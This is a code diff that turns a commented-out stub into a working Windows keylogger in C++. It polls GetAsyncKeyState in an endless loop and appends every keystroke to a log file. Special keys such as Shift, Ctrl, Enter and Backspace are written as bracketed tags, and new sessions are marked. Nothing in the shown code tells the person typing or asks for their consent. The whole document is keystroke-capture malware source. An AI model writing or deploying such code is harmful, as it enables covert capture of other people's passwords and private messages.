@@ -6,13 +6,11 @@
 #include <stdlib.h>
 #include <string>
 
-const int LINELENGTH = 10;
+const int LINELENGTH = 100;
 
 struct KeyInfo
 {
 	boolean specialClick = false;
-	boolean ctrlClick = false;
-	boolean shiftClick = false;
 	int keyCount = 0;
 	int currentLine = 0;
 };
@@ -31,39 +29,117 @@ std::string getFilePath()
     return path;
 }
 
+void initiateFileIfMissing(std::string path)
+{
+	std::ifstream infile(path);
+	if (infile.good() == false)
+	{
+		std::ofstream logFile;
+		logFile.open(path);
+		logFile.close();
+	}
+}
+
 KeyInfo clickedSpecialKey(std::string path, int key, std::fstream& logFile, KeyInfo keyInfo) 
 {
 	if (key == VK_BACK)
 	{
-		std::cout << keyInfo.keyCount - 1;
-		logFile.seekp(keyInfo.keyCount - 1);
-		std::cout << logFile.tellp();
-		logFile.write("", 1);
+		logFile << "{/b}";
+		keyInfo.keyCount = keyInfo.keyCount + 4;
 		keyInfo.specialClick = true;
-		keyInfo.keyCount = keyInfo.keyCount - 1;
 		return keyInfo;
 	}
 	else if (key == VK_CAPITAL)
 	{
+		logFile << "{CAP}";
+		keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_TAB)
+	{
+		logFile << "{TAB}";
+		keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_RETURN)
+	{
+		logFile << "{ENT}";
+		keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_SHIFT)
+	{
+		logFile << "{SHFT}";
+		keyInfo.keyCount = keyInfo.keyCount + 6;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_CONTROL)
+	{
+		logFile << "{CTRL}";
+		keyInfo.keyCount = keyInfo.keyCount + 6;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_MENU)
+	{
+		logFile << "{ALT}";
+		keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_ESCAPE)
+	{
+		logFile << "{ESC}";
+		keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_DELETE)
+	{
+		logFile << "{DEL}";
+		keyInfo.keyCount = keyInfo.keyCount + 5;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_OEM_COMMA)
+	{
+		logFile << ",";
+		keyInfo.keyCount++;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_OEM_PERIOD)
+	{
+		logFile << ".";
+		keyInfo.keyCount++;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_OEM_PLUS)
+	{
+		logFile << "+";
+		keyInfo.keyCount++;
+		keyInfo.specialClick = true;
+		return keyInfo;
+	}
+	else if (key == VK_OEM_MINUS)
+	{
+		logFile << "-";
+		keyInfo.keyCount++;
 		keyInfo.specialClick = true;
 		return keyInfo;
 	}
 	return keyInfo;
 }
 
-void goToLine(std::fstream& logFile, int line) 
-{
-	logFile.seekg(std::ios::beg);
-	for (int i = 1; i < line; ++i) 
-	{
-		logFile << "Line " << i;
-		logFile.ignore(1000, '\n');
-	}
-}
-
 int main()
 {
     std::string path = getFilePath();
+	initiateFileIfMissing(path);
     std::fstream logFile;
 
 	char keyPress = 'x';
@@ -71,17 +147,11 @@ int main()
 
 	logFile.open(path);
 	keyInfo.currentLine = std::count(std::istreambuf_iterator<char>(logFile),std::istreambuf_iterator<char>(), '\n') + 1;
-	std::cout << keyInfo.currentLine;
-	logFile << "\n";
-	logFile << "New Line!";
+	logFile << "\n\nNew Session\n";
 	logFile.close();
 
-	logFile.open(path);
-	goToLine(logFile, keyInfo.currentLine);
-	logFile.write("Worked", 6);
-	logFile.close();
+	int line = keyInfo.currentLine + 3;
 
-	/*
 	while (true) {
 		Sleep(10);
 		for (int keyPress = 8; keyPress <= 190; keyPress++)
@@ -89,9 +159,19 @@ int main()
 			if (GetAsyncKeyState(keyPress) == -32767)
 			{
 				logFile.open(path);
-				goToLine(logFile, keyInfo.currentLine);
-				logFile.seekp(keyInfo.keyCount);
+				keyInfo.currentLine = std::count(std::istreambuf_iterator<char>(logFile), std::istreambuf_iterator<char>(), '\n') + 1;
 
+				if (keyInfo.keyCount >= LINELENGTH)
+				{
+					keyInfo.currentLine++;
+				}
+
+				if (keyInfo.currentLine > line)
+				{
+					logFile << "\n";
+					keyInfo.keyCount = 0;
+					line++;
+				}
 
 				keyInfo = clickedSpecialKey(path, keyPress, logFile, keyInfo);
 
@@ -102,20 +182,13 @@ int main()
 					std::cout << s;
 					logFile.write(s.c_str(), 1);
 					keyInfo.keyCount++;
+				}
 
-				}
-				if (keyInfo.keyCount >= LINELENGTH)
-				{
-					logFile << '\n';
-					keyInfo.keyCount = 0;
-					keyInfo.currentLine++;
-				}
 				keyInfo.specialClick = false;
 				logFile.close();
 			}
 		}
 	}
-	*/
 
     return 0; 
 }
